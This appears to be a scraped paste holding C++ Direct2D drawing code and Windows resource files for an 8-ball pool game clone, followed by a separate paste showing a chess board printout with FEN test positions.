            TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
            TABLE_RIGHT,
            TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
        );
        pRT->DrawText(
            L""Choose a pocket..."",
            (UINT32)wcslen(L""Choose a pocket...""),
            pTextFormat,
            &txt,
            pBrush
        );
        // Note: no 'return'; allow foul/turn text to draw beneath if needed
    } */

    // new code ends here

        // --- MODIFIED: Foul Text (Large Red, Bottom Center) ---
        if (foulCommitted && currentGameState != SHOT_IN_PROGRESS) {
            ID2D1SolidColorBrush* pFoulBrush = nullptr;
            pRT->CreateSolidColorBrush(FOUL_TEXT_COLOR, &pFoulBrush);
            if (pFoulBrush && pLargeTextFormat) {
                // Calculate Rect for bottom-middle area
                float foulWidth = 200.0f; // Adjust width as needed
                float foulHeight = 60.0f;
                float foulLeft = TABLE_LEFT + (TABLE_WIDTH / 2.0f) - (foulWidth / 2.0f);
                // Position below the pocketed balls bar
                float foulTop = pocketedBallsBarRect.bottom + 10.0f;
                D2D1_RECT_F foulRect = D2D1::RectF(foulLeft, foulTop, foulLeft + foulWidth, foulTop + foulHeight);

                // --- Set text alignment to center for foul text ---
                pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

                pRT->DrawText(L""FOUL!"", 5, pLargeTextFormat, &foulRect, pFoulBrush);

                // --- Restore default alignment for large text if needed elsewhere ---
                // pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                // pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

                SafeRelease(&pFoulBrush);
            }
        }

        // --- Blue Arrow & Prompt for 8?Ball Call (while choosing or after called) ---
        if ((currentGameState == CHOOSING_POCKET_P1
            || currentGameState == CHOOSING_POCKET_P2)
            || (calledPocketP1 >= 0 || calledPocketP2 >= 0))
        {
            // determine index:
            //  - if a call exists, use it
            //  - if still choosing, use hover if any
            // determine index: use only the clicked call; default to top?right if unset
            int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
            if (idx < 0) idx = 2;

            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 15.0f, P.y - 40.0f},
                    {P.x + 15.0f, P.y - 40.0f},
                    {P.x       , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink); SafeRelease(&geom); SafeRelease(&pArrow);
            }

            // draw prompt below pockets
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &txt,
                pBrush
            );
            // do NOT return here; allow foul/turn text to display under the arrow
        }

        // Removed Obsolete
        /*
        // --- 8-Ball Pocket Selection Arrow & Prompt ---
        if (currentGameState == CHOOSING_POCKET_P1 || currentGameState == CHOOSING_POCKET_P2) {
            // Determine which pocket to highlight (default to Top-Right if unset)
            int idx = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
            if (idx < 0) idx = 2;

            // Draw the downward arrow
            ID2D1SolidColorBrush* pArrowBrush = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
            if (pArrowBrush) {
                D2D1_POINT_2F P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 10.0f, P.y - 30.0f},
                    {P.x + 10.0f, P.y - 30.0f},
                    {P.x        , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrowBrush);
                SafeRelease(&sink);
                SafeRelease(&geom);
                SafeRelease(&pArrowBrush);
            }

            // Draw “Choose a pocket...” text under the table
            D2D1_RECT_F prompt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &prompt,
                pBrush
            );

            return; // Skip normal turn/foul text
        }
        */


        // Show AI Thinking State (Unchanged from previous step)
        if (currentGameState == AI_THINKING && pTextFormat) {
            ID2D1SolidColorBrush* pThinkingBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pThinkingBrush);
            if (pThinkingBrush) {
                D2D1_RECT_F thinkingRect = p2Rect;
                thinkingRect.top += 20; // Offset within P2 box
                // Ensure default text alignment for this
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
                pRT->DrawText(L""Thinking..."", 11, pTextFormat, &thinkingRect, pThinkingBrush);
                SafeRelease(&pThinkingBrush);
            }
        }

        SafeRelease(&pBrush);

        // --- Draw CHEAT MODE label if active ---
        if (cheatModeEnabled) {
            ID2D1SolidColorBrush* pCheatBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Red), &pCheatBrush);
            if (pCheatBrush && pTextFormat) {
                D2D1_RECT_F cheatTextRect = D2D1::RectF(
                    TABLE_LEFT + 10.0f,
                    TABLE_TOP + 10.0f,
                    TABLE_LEFT + 200.0f,
                    TABLE_TOP + 40.0f
                );
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
                pRT->DrawText(L""CHEAT MODE ON"", wcslen(L""CHEAT MODE ON""), pTextFormat, &cheatTextRect, pCheatBrush);
            }
            SafeRelease(&pCheatBrush);
        }
    }

    void DrawPowerMeter(ID2D1RenderTarget* pRT) {
        // Draw Border
        ID2D1SolidColorBrush* pBorderBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
        if (!pBorderBrush) return;
        pRT->DrawRectangle(&powerMeterRect, pBorderBrush, 2.0f);
        SafeRelease(&pBorderBrush);

        // Create Gradient Fill
        ID2D1GradientStopCollection* pGradientStops = nullptr;
        ID2D1LinearGradientBrush* pGradientBrush = nullptr;
        D2D1_GRADIENT_STOP gradientStops[4];
        gradientStops[0].position = 0.0f;
        gradientStops[0].color = D2D1::ColorF(D2D1::ColorF::Green);
        gradientStops[1].position = 0.45f;
        gradientStops[1].color = D2D1::ColorF(D2D1::ColorF::Yellow);
        gradientStops[2].position = 0.7f;
        gradientStops[2].color = D2D1::ColorF(D2D1::ColorF::Orange);
        gradientStops[3].position = 1.0f;
        gradientStops[3].color = D2D1::ColorF(D2D1::ColorF::Red);

        pRT->CreateGradientStopCollection(gradientStops, 4, &pGradientStops);
        if (pGradientStops) {
            D2D1_LINEAR_GRADIENT_BRUSH_PROPERTIES props = {};
            props.startPoint = D2D1::Point2F(powerMeterRect.left, powerMeterRect.bottom);
            props.endPoint = D2D1::Point2F(powerMeterRect.left, powerMeterRect.top);
            pRT->CreateLinearGradientBrush(props, pGradientStops, &pGradientBrush);
            SafeRelease(&pGradientStops);
        }

        // Calculate Fill Height
        float fillRatio = 0;
        //if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
            // Determine if power meter should reflect shot power (human aiming or AI preparing)
        bool humanIsAimingPower = isAiming && (currentGameState == AIMING || currentGameState == BREAKING);
        // NEW Condition: AI is displaying its aim, so show its chosen power
        bool aiIsVisualizingPower = (isPlayer2AI && currentPlayer == 2 &&
            currentGameState == AI_THINKING && aiIsDisplayingAim);

        if (humanIsAimingPower || aiIsVisualizingPower) { // Use the new condition
            fillRatio = shotPower / MAX_SHOT_POWER;
        }
        float fillHeight = (powerMeterRect.bottom - powerMeterRect.top) * fillRatio;
        D2D1_RECT_F fillRect = D2D1::RectF(
            powerMeterRect.left,
            powerMeterRect.bottom - fillHeight,
            powerMeterRect.right,
            powerMeterRect.bottom
        );

        if (pGradientBrush) {
            pRT->FillRectangle(&fillRect, pGradientBrush);
            SafeRelease(&pGradientBrush);
        }

        // Draw scale notches
        ID2D1SolidColorBrush* pNotchBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pNotchBrush);
        if (pNotchBrush) {
            for (int i = 0; i <= 8; ++i) {
                float y = powerMeterRect.top + (powerMeterRect.bottom - powerMeterRect.top) * (i / 8.0f);
                pRT->DrawLine(
                    D2D1::Point2F(powerMeterRect.right + 2.0f, y),
                    D2D1::Point2F(powerMeterRect.right + 8.0f, y),
                    pNotchBrush,
                    1.5f
                );
            }
            SafeRelease(&pNotchBrush);
        }

        // Draw ""Power"" Label Below Meter
        if (pTextFormat) {
            ID2D1SolidColorBrush* pTextBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pTextBrush);
            if (pTextBrush) {
                D2D1_RECT_F textRect = D2D1::RectF(
                    powerMeterRect.left - 20.0f,
                    powerMeterRect.bottom + 8.0f,
                    powerMeterRect.right + 20.0f,
                    powerMeterRect.bottom + 38.0f
                );
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
                pRT->DrawText(L""Power"", 5, pTextFormat, &textRect, pTextBrush);
                SafeRelease(&pTextBrush);
            }
        }

        // Draw Glow Effect if fully charged or fading out
        static float glowPulse = 0.0f;
        static bool glowIncreasing = true;
        static float glowFadeOut = 0.0f; // NEW: tracks fading out

        if (shotPower >= MAX_SHOT_POWER * 0.99f) {
            // While fully charged, keep pulsing normally
            if (glowIncreasing) {
                glowPulse += 0.02f;
                if (glowPulse >= 1.0f) glowIncreasing = false;
            }
            else {
                glowPulse -= 0.02f;
                if (glowPulse <= 0.0f) glowIncreasing = true;
            }
            glowFadeOut = 1.0f; // Reset fade out to full
        }
        else if (glowFadeOut > 0.0f) {
            // If shot fired, gradually fade out
            glowFadeOut -= 0.02f;
            if (glowFadeOut < 0.0f) glowFadeOut = 0.0f;
        }

        if (glowFadeOut > 0.0f) {
            ID2D1SolidColorBrush* pGlowBrush = nullptr;
            float effectiveOpacity = (0.3f + 0.7f * glowPulse) * glowFadeOut;
            pRT->CreateSolidColorBrush(
                D2D1::ColorF(D2D1::ColorF::Red, effectiveOpacity),
                &pGlowBrush
            );
            if (pGlowBrush) {
                float glowCenterX = (powerMeterRect.left + powerMeterRect.right) / 2.0f;
                float glowCenterY = powerMeterRect.top;
                D2D1_ELLIPSE glowEllipse = D2D1::Ellipse(
                    D2D1::Point2F(glowCenterX, glowCenterY - 10.0f),
                    12.0f + 3.0f * glowPulse,
                    6.0f + 2.0f * glowPulse
                );
                pRT->FillEllipse(&glowEllipse, pGlowBrush);
                SafeRelease(&pGlowBrush);
            }
        }
    }

    void DrawSpinIndicator(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pWhiteBrush = nullptr;
        ID2D1SolidColorBrush* pRedBrush = nullptr;

        pRT->CreateSolidColorBrush(CUE_BALL_COLOR, &pWhiteBrush);
        pRT->CreateSolidColorBrush(ENGLISH_DOT_COLOR, &pRedBrush);

        if (!pWhiteBrush || !pRedBrush) {
            SafeRelease(&pWhiteBrush);
            SafeRelease(&pRedBrush);
            return;
        }

        // Draw White Ball Background
        D2D1_ELLIPSE bgEllipse = D2D1::Ellipse(spinIndicatorCenter, spinIndicatorRadius, spinIndicatorRadius);
        pRT->FillEllipse(&bgEllipse, pWhiteBrush);
        pRT->DrawEllipse(&bgEllipse, pRedBrush, 0.5f); // Thin red border


        // Draw Red Dot for Spin Position
        float dotRadius = 4.0f;
        float dotX = spinIndicatorCenter.x + cueSpinX * (spinIndicatorRadius - dotRadius); // Keep dot inside edge
        float dotY = spinIndicatorCenter.y + cueSpinY * (spinIndicatorRadius - dotRadius);
        D2D1_ELLIPSE dotEllipse = D2D1::Ellipse(D2D1::Point2F(dotX, dotY), dotRadius, dotRadius);
        pRT->FillEllipse(&dotEllipse, pRedBrush);

        SafeRelease(&pWhiteBrush);
        SafeRelease(&pRedBrush);
    }


    void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pBgBrush = nullptr;
        ID2D1SolidColorBrush* pBallBrush = nullptr;

        // Ensure render target is valid before proceeding
        if (!pRT) return;

        HRESULT hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black, 0.8f), &pBgBrush); // Semi-transparent black
        if (FAILED(hr)) { SafeRelease(&pBgBrush); return; } // Exit if brush creation fails

        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBallBrush); // Placeholder, color will be set per ball
        if (FAILED(hr)) {
            SafeRelease(&pBgBrush);
            SafeRelease(&pBallBrush);
            return; // Exit if brush creation fails
        }

        // Draw the background bar (rounded rect)
        D2D1_ROUNDED_RECT roundedRect = D2D1::RoundedRect(pocketedBallsBarRect, 10.0f, 10.0f); // Corner radius 10
        float baseAlpha = 0.8f;
        float flashBoost = pocketFlashTimer * 0.5f; // Make flash effect boost alpha slightly
        float finalAlpha = std::min(1.0f, baseAlpha + flashBoost);
        pBgBrush->SetOpacity(finalAlpha);
        pRT->FillRoundedRectangle(&roundedRect, pBgBrush);
        pBgBrush->SetOpacity(1.0f); // Reset opacity after drawing

        // --- Draw small circles for pocketed balls inside the bar ---

        // Calculate dimensions based on the bar's height for better scaling
        float barHeight = pocketedBallsBarRect.bottom - pocketedBallsBarRect.top;
        float ballDisplayRadius = barHeight * 0.30f; // Make balls slightly smaller relative to bar height
        float spacing = ballDisplayRadius * 2.2f; // Adjust spacing slightly
        float padding = spacing * 0.75f; // Add padding from the edges
        float center_Y = pocketedBallsBarRect.top + barHeight / 2.0f; // Vertical center

        // Starting X positions with padding
        float currentX_P1 = pocketedBallsBarRect.left + padding;
        float currentX_P2 = pocketedBallsBarRect.right - padding; // Start from right edge minus padding

        int p1DrawnCount = 0;
        int p2DrawnCount = 0;
        const int maxBallsToShow = 7; // Max balls per player in the bar

        for (const auto& b : balls) {
            if (b.isPocketed) {
                // Skip cue ball and 8-ball in this indicator
                if (b.id == 0 || b.id == 8) continue;

                bool isPlayer1Ball = (player1Info.assignedType != BallType::NONE && b.type == player1Info.assignedType);
                bool isPlayer2Ball = (player2Info.assignedType != BallType::NONE && b.type == player2Info.assignedType);

                if (isPlayer1Ball && p1DrawnCount < maxBallsToShow) {
                    pBallBrush->SetColor(b.color);
                    // Draw P1 balls from left to right
                    D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P1 + p1DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                    pRT->FillEllipse(&ballEllipse, pBallBrush);
                    p1DrawnCount++;
                }
                else if (isPlayer2Ball && p2DrawnCount < maxBallsToShow) {
                    pBallBrush->SetColor(b.color);
                    // Draw P2 balls from right to left
                    D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P2 - p2DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                    pRT->FillEllipse(&ballEllipse, pBallBrush);
                    p2DrawnCount++;
                }
                // Note: Balls pocketed before assignment or opponent balls are intentionally not shown here.
                // You could add logic here to display them differently if needed (e.g., smaller, grayed out).
            }
        }

        SafeRelease(&pBgBrush);
        SafeRelease(&pBallBrush);
    }

    void DrawBallInHandIndicator(ID2D1RenderTarget* pRT) {
        if (!isDraggingCueBall && (currentGameState != BALL_IN_HAND_P1 && currentGameState != BALL_IN_HAND_P2 && currentGameState != PRE_BREAK_PLACEMENT)) {
            return; // Only show when placing/dragging
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall) return;

        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.6f), &pGhostBrush); // Semi-transparent white

        if (pGhostBrush) {
            D2D1_POINT_2F drawPos;
            if (isDraggingCueBall) {
                drawPos = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
            }
            else {
                // If not dragging but in placement state, show at current ball pos
                drawPos = D2D1::Point2F(cueBall->x, cueBall->y);
            }

            // Check if the placement is valid before drawing differently?
            bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
            bool isValid = IsValidCueBallPosition(drawPos.x, drawPos.y, behindHeadstring);

            if (!isValid) {
                // Maybe draw red outline if invalid placement?
                pGhostBrush->SetColor(D2D1::ColorF(D2D1::ColorF::Red, 0.6f));
            }


            D2D1_ELLIPSE ghostEllipse = D2D1::Ellipse(drawPos, BALL_RADIUS, BALL_RADIUS);
            pRT->FillEllipse(&ghostEllipse, pGhostBrush);
            pRT->DrawEllipse(&ghostEllipse, pGhostBrush, 1.0f); // Outline

            SafeRelease(&pGhostBrush);
        }
    }

    void DrawPocketSelectionIndicator(ID2D1RenderTarget* pRT) {
        /*  Never show the arrow while the player is still placing the
        cue-ball (ball-in-hand) – it otherwise hides behind the
        ghost-ball and can lock the UI.                               */

        /* Still skip the opening-break placement,
       but show the arrow during BALL-IN-HAND */
       // ? skip when no active call for the CURRENT shooter
        if ((currentPlayer == 1 && calledPocketP1 < 0) ||
            (currentPlayer == 2 && calledPocketP2 < 0))    return;
        /*if (currentGameState == PRE_BREAK_PLACEMENT)
            return;*/ //new ai-asked-to-disable
            /*if (currentGameState == BALL_IN_HAND_P1 ||
                currentGameState == BALL_IN_HAND_P2 ||
                currentGameState == PRE_BREAK_PLACEMENT)
            {
                return;
            }*/

        int pocketToIndicate = -1;
        // Whenever EITHER player has pocketed their first 7 and has called (human or AI),
        // we forcibly show their arrow—regardless of currentGameState.
        if ((currentPlayer == 1 && player1Info.ballsPocketedCount >= 7 && calledPocketP1 >= 0) ||
            (currentPlayer == 2 && player2Info.ballsPocketedCount >= 7 && calledPocketP2 >= 0))
        {
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }
        /*// A human player is actively choosing if they are in the CHOOSING_POCKET state.
        bool isHumanChoosing = (currentGameState == CHOOSING_POCKET_P1 || (currentGameState == CHOOSING_POCKET_P2 && !isPlayer2AI));

        if (isHumanChoosing) {
            // When choosing, show the currently selected pocket (which has a default).
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }
        else if (IsPlayerOnEightBall(currentPlayer)) {
            // If it's a normal turn but the player is on the 8-ball, show their called pocket as a reminder.
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }*/

        if (pocketToIndicate < 0 || pocketToIndicate > 5) {
            return; // Don't draw if no pocket is selected or relevant.
        }

        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Yellow, 0.9f), &pArrowBrush);
        if (!pArrowBrush) return;

        // ... The rest of your arrow drawing geometry logic remains exactly the same ...
        // (No changes needed to the points/path drawing, only the logic above)
        D2D1_POINT_2F targetPocketCenter = pocketPositions[pocketToIndicate];
        float arrowHeadSize = HOLE_VISUAL_RADIUS * 0.5f;
        float arrowShaftLength = HOLE_VISUAL_RADIUS * 0.3f;
        float arrowShaftWidth = arrowHeadSize * 0.4f;
        float verticalOffsetFromPocketCenter = HOLE_VISUAL_RADIUS * 1.6f;
        D2D1_POINT_2F tip, baseLeft, baseRight, shaftTopLeft, shaftTopRight, shaftBottomLeft, shaftBottomRight;

        if (targetPocketCenter.y == TABLE_TOP) {
            tip = D2D1::Point2F(targetPocketCenter.x, targetPocketCenter.y + verticalOffsetFromPocketCenter + arrowHeadSize);
            baseLeft = D2D1::Point2F(targetPocketCenter.x - arrowHeadSize / 2.0f, targetPocketCenter.y + verticalOffsetFromPocketCenter);
            baseRight = D2D1::Point2F(targetPocketCenter.x + arrowHeadSize / 2.0f, targetPocketCenter.y + verticalOffsetFromPocketCenter);
            shaftTopLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y);
            shaftTopRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y);
            shaftBottomLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y - arrowShaftLength);
            shaftBottomRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y - arrowShaftLength);
        }
        else {
            tip = D2D1::Point2F(targetPocketCenter.x, targetPocketCenter.y - verticalOffsetFromPocketCenter - arrowHeadSize);
            baseLeft = D2D1::Point2F(targetPocketCenter.x - arrowHeadSize / 2.0f, targetPocketCenter.y - verticalOffsetFromPocketCenter);
            baseRight = D2D1::Point2F(targetPocketCenter.x + arrowHeadSize / 2.0f, targetPocketCenter.y - verticalOffsetFromPocketCenter);
            shaftTopLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y + arrowShaftLength);
            shaftTopRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y + arrowShaftLength);
            shaftBottomLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y);
            shaftBottomRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y);
        }

        ID2D1PathGeometry* pPath = nullptr;
        if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
            ID2D1GeometrySink* pSink = nullptr;
            if (SUCCEEDED(pPath->Open(&pSink))) {
                pSink->BeginFigure(tip, D2D1_FIGURE_BEGIN_FILLED);
                pSink->AddLine(baseLeft); pSink->AddLine(shaftBottomLeft); pSink->AddLine(shaftTopLeft);
                pSink->AddLine(shaftTopRight); pSink->AddLine(shaftBottomRight); pSink->AddLine(baseRight);
                pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                pSink->Close();
                SafeRelease(&pSink);
                pRT->FillGeometry(pPath, pArrowBrush);
            }
            SafeRelease(&pPath);
        }
        SafeRelease(&pArrowBrush);
    }
```
 
==++ Here's the full source for (file 2/3 (No OOP-based)) ""resource.h""::: ++==
```resource.h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Yahoo-8Ball-Pool-Clone.rc
//
#define IDI_ICON1                       101
// --- NEW Resource IDs (Define these in your .rc file / resource.h) ---
#define IDD_NEWGAMEDLG 106
#define IDC_RADIO_2P   1003
#define IDC_RADIO_CPU  1005
#define IDC_GROUP_AI   1006
#define IDC_RADIO_EASY 1007
#define IDC_RADIO_MEDIUM 1008
#define IDC_RADIO_HARD 1009
// --- NEW Resource IDs for Opening Break ---
#define IDC_GROUP_BREAK_MODE 1010
#define IDC_RADIO_CPU_BREAK  1011
#define IDC_RADIO_P1_BREAK   1012
#define IDC_RADIO_FLIP_BREAK 1013
// Standard IDOK is usually defined, otherwise define it (e.g., #define IDOK 1)
 
// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40002 // Incremented
#define _APS_NEXT_CONTROL_VALUE         1014 // Incremented
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
 
```
 
==++ Here's the full source for (file 3/3 (No OOP-based)) ""Yahoo-8Ball-Pool-Clone.rc""::: ++==
```Yahoo-8Ball-Pool-Clone.rc
// Microsoft Visual C++ generated resource script.
//
#include ""resource.h""
 
#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include ""winres.h""
 
/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS
 
/////////////////////////////////////////////////////////////////////////////
// English (United States) resources
 
#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)
 
#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//
 
1 TEXTINCLUDE 
BEGIN
    ""resource.h\0""
END
 
2 TEXTINCLUDE 
BEGIN
    ""#include """"winres.h""""\r\n""
    ""\0""
END
 
3 TEXTINCLUDE 
BEGIN
    ""\r\n""
    ""\0""
END
 
#endif    // APSTUDIO_INVOKED
 
 
/////////////////////////////////////////////////////////////////////////////
//
// Icon
//
 
// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
IDI_ICON1               ICON                    ""D:\\Download\\cpp-projekt\\FuzenOp_SiloTest\\icons\\shell32_277.ico""
 
#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////
 
 
 
#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//
 
 
/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED
 
#include <windows.h> // Needed for control styles like WS_GROUP, BS_AUTORADIOBUTTON etc.
 
/////////////////////////////////////////////////////////////////////////////
//
// Dialog
//
 
IDD_NEWGAMEDLG DIALOGEX 0, 0, 220, 185 // Dialog position (x, y) and size (width, height) in Dialog Units (DLUs) - Increased Height
STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
CAPTION ""New 8-Ball Game""
FONT 8, ""MS Shell Dlg"", 400, 0, 0x1 // Standard dialog font
BEGIN
// --- Game Mode Selection ---
// Group Box for Game Mode (Optional visually, but helps structure)
GROUPBOX        ""Game Mode"", IDC_STATIC, 7, 7, 90, 50
 
// ""2 Player"" Radio Button (First in this group)
CONTROL         ""&2 Player (Human vs Human)"", IDC_RADIO_2P, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 14, 20, 80, 10
 
// ""Human vs CPU"" Radio Button
CONTROL         ""Human vs &CPU"", IDC_RADIO_CPU, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 14, 35, 70, 10
 
 
// --- AI Difficulty Selection (Inside its own Group Box) ---
GROUPBOX        ""AI Difficulty"", IDC_GROUP_AI, 118, 7, 95, 70
 
// ""Easy"" Radio Button (First in the AI group)
CONTROL         ""&Easy"", IDC_RADIO_EASY, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 125, 20, 60, 10
 
// ""Medium"" Radio Button
CONTROL         ""&Medium"", IDC_RADIO_MEDIUM, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 35, 60, 10
 
// ""Hard"" Radio Button
CONTROL         ""&Hard"", IDC_RADIO_HARD, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 50, 60, 10
 
// --- Opening Break Modes (For Versus CPU Only) ---
GROUPBOX        ""Opening Break Modes:"", IDC_GROUP_BREAK_MODE, 118, 82, 95, 60
 
// ""CPU Break"" Radio Button (Default for this group)
CONTROL         ""&CPU Break"", IDC_RADIO_CPU_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 125, 95, 70, 10
 
// ""P1 Break"" Radio Button
CONTROL         ""&P1 Break"", IDC_RADIO_P1_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 110, 70, 10
 
// ""FlipCoin Break"" Radio Button
CONTROL         ""&FlipCoin Break"", IDC_RADIO_FLIP_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 125, 70, 10
 
 
// --- Standard Buttons ---
DEFPUSHBUTTON   ""Start"", IDOK, 55, 160, 50, 14 // Default button (Enter key) - Adjusted Y position
PUSHBUTTON      ""Cancel"", IDCANCEL, 115, 160, 50, 14 // Adjusted Y position
END
 
```"
Hixy3tbZ,vystup OK,max2201111,Python,Friday 11th of July 2025 12:30:44 PM CDT,"+-----------------+
8 | . . . . . . . . |
7 | . . . . . . . . |
6 | . . . . . . . . |
5 | . . . . . . . . |
4 | Q . . . . . . . |
3 | . . . . . . k . |
2 | . . . . . . . . |
1 | . . . . . . K . |
  +-----------------+
    a b c d e f g h
Dostupné testovací pozice:
1. Jednoduchý mat: 8/8/8/8/Q7/6k1/8/6K1 w - - 0 1
2. Delší mat: 8/6K1/3b4/4n1k1/8/8/8/8 w - - 0 1
3. Weak Amazon: 8/6k1/1A6/8/3K4/8/8/8 w - - 0 1

Testování šachové analýzy s pohádkovými figurami...
Vybraná pozice: Jednoduchý mat
FEN: 8/8/8/8/Q7/6k1/8/6K1 w - - 0 1
